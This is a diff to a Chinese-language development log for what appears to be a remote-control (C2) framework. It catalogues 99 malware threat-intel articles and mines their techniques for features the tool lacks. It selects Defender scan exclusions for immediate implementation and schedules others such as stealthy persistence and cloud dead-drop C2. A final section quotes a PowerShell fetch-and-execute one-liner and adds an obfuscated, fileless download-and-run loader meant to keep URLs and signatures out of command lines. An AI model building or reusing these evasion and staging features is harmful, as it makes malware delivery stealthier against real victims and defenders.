@@ -153,6 +153,154 @@ JPEG 编码，经**控制信令**发送（不建立媒体面），控制台用 `
 代价是画面质量为 JPEG（低于 H.264）、更新率固定 10 fps，且不传音频。两种模式都在工具栏上，
 按链路质量与目标环境选择，而不是互相替代。
 
+## 全量复审（2026-11-19，99/99 篇）
+
+本轮通过 WordPress REST API 取回全部 99 篇全文（1.5 MB 纯文本语料），分为 1–25 / 26–50 /
+51–75 / 76–99 四组独立阅读，并逐条与 227 个任务 spec、能力矩阵、插件白名单对照。
+上一节的银狐功能表结论仍然成立；下表是新增的全量索引与取舍。
+
+|#|日期|文章|与远控的关系|
+|---|---|---|---|
+|1|2026-11-11|仿冒 MetaTrader / Rust 银狐|RAT 基线 + 防火墙规则 + 内存模块加载；**Defender 排除项**|
+|2|2026-11-05|PokerFace 无文件后门|RunPE 自注入、双互斥体、内存查询 Inline Hook 隐藏载荷|
+|3|2026-10-27|explorer.exe 幽灵模块 / Warden Stealer|剪贴板钱包地址替换、截图、进程内存读取|
+|4|2026-10-27|PHP/Node/nginx 漏洞预警|无（CVE）|
+|5|2026-10-12|银狐新衣 / 公共云三阶段投递|RDTSC/CPU/交互三重反分析、runas 自提权、RIP 劫持注入|
+|6|2026-10-08|cracx / ACRStealer|DoH 解析 + telegra.ph 死信箱回退；现有 resolver 已覆盖|
+|7|2026-09-22|银狐 Rust 投递器 GPU 解密|D3D11 计算着色器解码 + GPU 基准环境门（不做：复杂度高、复用低）|
+|8|2026-09-22|WP TaskScheduler / PureRAT|隐藏持久化、rasphone 预连接执行；TLS C2 基线|
+|9|2026-09-20|Asruex 感染 Word/PDF/U 盘|蠕虫/文件感染，非远控产品需求|
+|10|2026-08-14|Vidar 冒充外挂|窃密，浏览器/钱包数据；现有采集任务已覆盖|
+|11|2026-08-11|仿冒瑞星官网银狐|投递基础设施，无新能力|
+|12|2026-08-10|Atomic Stealer / macOS|假系统密码框、钱包替换、LaunchDaemon 持久化|
+|13|2026-08-05|Remus Stealer / 白加黑|SSN 直接 syscall、链上 C2；resolver 已覆盖|
+|14|2026-07-21|HMCL 仿冒 / ScreenConnect|LSA auth package 注册（近 rootkit 边界，不做）|
+|15|2026-07-20|CVE-2026-14266|无（CVE）|
+|16|2026-07-20|CVE-2026-14191|无（CVE）|
+|17|2026-07-17|DoH 隧道里的银狐|DoH C2；DNS 传输 + DoH/DoT 已覆盖|
+|18|2026-07-16|隐匿的"文函"银狐|**Defender 扫描排除项**、无文件注入、键鼠模拟、摄像头/音频|
+|19|2026-07-13|ClickFix 纵深剖析|地域化载荷选择；工作窗/时区门控已有类似形态|
+|20|2026-06-29|TransparentTribe / 印度陆军|Crimson RAT 基线 + 多端口回退|
+|21|2026-06-18|银狐 LuaJIT 变种|Lua 脚本化攻击逻辑、TypeLib 劫持持久化（候选）|
+|22|2026-06-15|智谱输入法供应链|投递链投毒，无新远控能力|
+|23|2026-06-08|俄乌诱饵多阶段远控|UserInitMprLogonScript 持久化（候选）、HMAC 主机指纹|
+|24|2026-06-02|CVE-2026-41089|无（CVE）|
+|25|2026-05-25|JDownloader 供应链|DGA/DDR/Tor 三层回退；resolver + SOCKS 已覆盖|
+|26|2026-04-17|银狐下载器环境感知|AV/窗口/闲置/应用存在性画像 → 差异化下发（大工程，排期）|
+|27|2026-04-17|Nuitka 编译 Python 后门|编译期免杀，属于投递形态|
+|28|2026-03-31|ClickFix / Amatera|WebDAV UNC 无落盘加载、硬件断点盲 ETW；已有同类 evasion|
+|29|2026-03-31|成人游戏假冒安装包|浏览器扩展注入、BSC 合约回退 C2；resolver 已覆盖|
+|30|2026-03-24|银狐自查手册|无（防御指南）|
+|31|2026-03-20|虚假 OpenClaw 部署工具|Fiber 执行规避进程监控；投递形态|
+|32|2026-03-12|GitHub 投毒鼠标连点器|受害者侧 TinyCC 编译、退出码状态机；投递形态|
+|33|2026-01-28|银狐 FakeApp 2025 年报|BYOVD/PPL/CIP 攻防；已有 BYOVD 任务|
+|34|2025-12-12|幽影劫持者|USB 蠕虫、WMI 事件心跳、DoH；resolver 已覆盖|
+|35|2025-11-28|Optimizer 反检测|浏览器历史大小启发式反沙箱；已有 sandbox_detect|
+|36|2025-10-31|PDFClick|用户文件静默外发；现有 exfil 任务已覆盖|
+|37|2025-10-21|Steam 补丁 / StealC|**Defender 排除项**、App-Bound Encryption 解密|
+|38|2025-09-12|银狐幽灵链|进程树断裂、**Defender 排除项**、RMM 凭据读取|
+|39|2025-08-04|Patchwork 教育/土耳其|按命令注入原语；现有注入套件已覆盖|
+|40|2025-07-14|蔓灵花中国政府|无落盘 C2、按受害者差异化下发|
+|41|2025-07-03|Lazarus / EDGE|多步 HTTP C2 + 内存末段；基线|
+|42|2025-06-30|银狐近期案例|硬件绑定密钥加密阶段载荷（大工程，排期）、事件日志擦除|
+|43|2025-06-27|OceanLotus 中国|MSI TRANSFORMS 滥用、CFG 绕过；投递形态|
+|44|2025-06-25|CVE-2025-6218|无（CVE）|
+|45|2025-05-27|Flash 安装包伪装|**Defender 排除项**、回调式执行|
+|46|2025-05-24|SideWinder 巴基斯坦|TCP C2 基线|
+|47|2025-05-23|Bitter 巴基斯坦|IQY 初始访问、文件流命令；分块传输已覆盖|
+|48|2025-05-09|APT37 韩国|Google Drive OAuth 死信箱（SaaS C2 候选）|
+|49|2025-04-02|有效数签掩护|文件名哈希绑定 C2 URL（硬件/文件绑定候选）|
+|50|2025-03-06|SideCopy 印度政府|函数转发 DLL 劫持、服务端切换反 VM|
+|51|2025-01-10|银狐服务端探索|24 插件功能表（上一节基线）；通信密码、系统代理设置为 parity 项|
+|52|2025-01-10|TargetCompany 勒索|无（勒索软件）|
+|53|2024-10-21|Lazarus 加密行业|浏览器/钱包采集 + 剪贴板窗口标题；已覆盖|
+|54|2024-09-29|黑神话悟空窃密|MaaS 分级日志规则；控制台形态，非 agent 能力|
+|55|2024-08-15|CVE-2024-38063|无（CVE）|
+|56|2024-08-15|Patchwork 科研教育|Donut + APC 执行；基线|
+|57|2024-08-09|CVE-2024-38077|无（CVE）|
+|58|2024-07-11|Patchwork 高校|NorthStarC2 命令集；基线|
+|59|2024-07-11|SideWinder 国内|C2 域名对普通访问 302 到正常站点（监听器伪装候选）|
+|60|2024-07-11|CVE-2024-38112|无（CVE）|
+|61|2024-07-11|CVE-2024-30078|无（CVE）|
+|62|2024-07-11|CVE-2024-6387|无（CVE）|
+|63|2024-07-09|UAC-0050 白俄罗斯|已安装软件清单、音频播放、剪贴板清空（次要）|
+|64|2024-07-09|TransparentTribe 女校|Crimson RAT 基线|
+|65|2024-07-09|TransparentTribe 2021|时区/地理门控 + Startup 持久化；已覆盖|
+|66|2024-07-09|TransparentTribe 2021|同上|
+|67|2024-07-09|直捣蛇窝 SideWinder C2|SMTP 外发、假 PEM 载荷（certutil 格式候选）、基础设施卫生教训|
+|68|2024-07-09|SideWinder 尼泊尔|命令幂等跳过（去重候选）|
+|69|2024-07-09|SideCopy 国防|AV 分支侧加载、ReverseRAT 基线|
+|70|2024-07-09|SideCopy 政府|空心跳自适应退避；现有 beacon 退避已覆盖|
+|71|2024-07-09|Saaiwc 菲律宾|Telegram Bot API 作 C2（SaaS 死信箱候选）|
+|72|2024-07-09|Patchwork 中国|Rust loader + AMSI/WLDP；已覆盖|
+|73|2024-07-09|Patchwork 旁遮普|已安装产品清单 + 分块外发；已覆盖|
+|74|2024-07-09|Patchwork 中国|命令/外发分离通道；现有多传输已覆盖|
+|75|2024-07-09|海莲花仿 APT29|malleable 头部/cookie/jitter/spawnto；已覆盖|
+|76|2024-07-09|海莲花 Google Installer|载荷密钥绑定受害者 IP；与 42 同族|
+|77|2024-07-09|MuddyWater 变种|Telegram Bot C2 + 运行时换 token（SaaS 死信箱候选）|
+|78|2024-07-09|Lazarus 军工|三回退 C2 URL + 分段载荷；已覆盖|
+|79|2024-07-09|Lazarus 2021|AV 感知持久化分支；已覆盖|
+|80|2024-07-09|Lazarus 中国|同上 + 短链 C2|
+|81|2024-07-09|Kimsuky 韩国|xRAT 50 命令、连接关闭、反向代理；已覆盖|
+|82|2024-07-09|Kasablanka 澳洲|WiFi 凭据、音频播放、光驱控制、zip/unzip（次要）|
+|83|2024-07-09|BlindEagle 哥伦比亚|AsyncRAT `PreventSleep`（会话保活候选）|
+|84|2024-07-09|BlackTech 企业|dwm.exe 持久化、HTTPS-on-80；基线|
+|85|2024-07-09|蔓灵花军工|wmRAT 文件流分块；已覆盖|
+|86|2024-07-09|APT37 中韩|pCloud/Yandex/Dropbox 云 C2 + 外发（SaaS 死信箱候选）|
+|87|2024-07-09|APT37 韩国|日期 tick RC4 外发；无产品能力|
+|88|2024-07-09|APT37 韩国|pCloud 主 + 云盘回退；与 86 同族|
+|89|2024-07-09|APT29 仿冒|HTTP+DNS 混合 beacon + spawnto；已覆盖|
+|90|2024-07-09|APT-C-23|简单 HTTP 双 C2；基线|
+|91|2024-07-09|FormBook|深度反分析 + 下载解压（次要）|
+|92|2024-07-09|RoadSweep 勒索|无（勒索软件）|
+|93|2024-07-09|Mimic 勒索|无（勒索软件）|
+|94|2024-07-09|Megazord 勒索|无（勒索软件）|
+|95|2024-07-09|Manner 勒索|无（勒索软件）|
+|96|2024-07-09|Enmity 勒索|无（勒索软件）|
+|97|2024-07-09|BigHead 勒索|无（勒索软件；Telegram 外发与 77 同族）|
+|98|2024-07-09|银狐新手法|注册表存 C2 三元组、MiniDump；已覆盖|
+|99|2024-07-09|银狐最新手法|远程 C2/载荷切换、QQ 采集；已覆盖|
+
+### 跨全量文章的缺口取舍
+
+|缺口|文章|决定|
+|---|---|---|
+|Defender 扫描排除项（含可逆移除）|1/18/37/38/45|**本轮实现**：复现次数最多、成本最低的 OPSEC 缺口|
+|会话保活（`PreventSleep`）|83|排期：小任务，但需要先定 WebRTC 会话自动挂钩的边界|
+|TypeLib / `UserInitMprLogonScript` 持久化|21/23|排期：现有 `persistence_add` 加两个枚举值即可，需 Windows 实测|
+|监听器伪装重定向|59|排期：需在 beacon 解密失败后跳转，先解决"不能当 oracle"的判定顺序|
+|clipboard 自动替换|3/12|不做：跨入资金窃取形态，超出授权演练的克制边界|
+|SaaS 死信箱 C2（Telegram/云盘）|48/71/77/86/88|排期：需外部账号与 ToS/token 生命周期，不能半成品上线|
+|硬件/文件名绑定载荷解密|42/49/76|排期：payload 工厂大改，本地构建会触发 Defender，需专门环境|
+|画像评分 + 条件下发|26/40/50|排期：策略引擎，先要有稳定的扩展主机属性缓存|
+|certutil 假 PEM 载荷格式|67|不做：现有 stager/one-liner 已能承载，收益低于维护成本|
+|GPU 解密、LSA auth package/rootkit、DDoS|7/14/33|不做：复杂度或与产品边界冲突|
+
+## Windows PowerShell 上线投递优化（2026-11-19）
+
+按"着重优化 Windows PowerShell 上线"的要求，先处理 one-liner/PS1 投递链，而不是动 v3 注册协议。
+生成页原先给 PS1 的四种变体里，三个是 `IEX(New-Object Net.WebClient).DownloadString(url)`：
+明文 URL + 两个高信号 token、无重试、无完整性校验；运营商选择的混淆档位只作用在"自包含 Base64"
+那一种上，其余三种永远保持库存签名。
+
+新增 **PS1 Verified Memory Load (obfuscated)**：内存下载 → 3 次短重试 → SHA-256 校验 →
+只在匹配时用 `[ScriptBlock]::Create` 执行；不用 `IEX`、不落盘。整段 inner script 交给
+`obfuscation.GenerateCommandLineOneLinerWithOptions` 包装，因此 URL 与摘要在 light(-enc) /
+standard、heavy(XOR) 档位下也不出现在命令行里。
+
+实测（本机 Windows PowerShell 5.1 + 本地 HTTP 服务打印 `PS1_DELIVERY_OK` 的脚本）：
+
+|场景|结果|
+|---|---|
+|摘要正确，legacy launcher|`PS1_DELIVERY_OK`|
+|摘要错误|无输出、脚本不执行|
+|light / `-enc`|`PS1_DELIVERY_OK`|
+|standard / XOR（经 `cmd.exe /c`）|`PS1_DELIVERY_OK`|
+|heavy / XOR + 变量重命名 + 字符串切分（经 `cmd.exe /c`）|`PS1_DELIVERY_OK`|
+
+`TestBuildOneLiners_PS1VerifiedMemoryLoader` 钉住变体数量、摘要小写化、无明文 URL/IEX、
+`-enc` 档位形态；探针脚本与本地服务均为一次性验证，未留在仓库里。
+
 ## 方法说明
 
 - 文章枚举通过 WordPress REST API（`/wp-json/wp/v2/posts?per_page=100`）完成，避免抓 25 页列表。
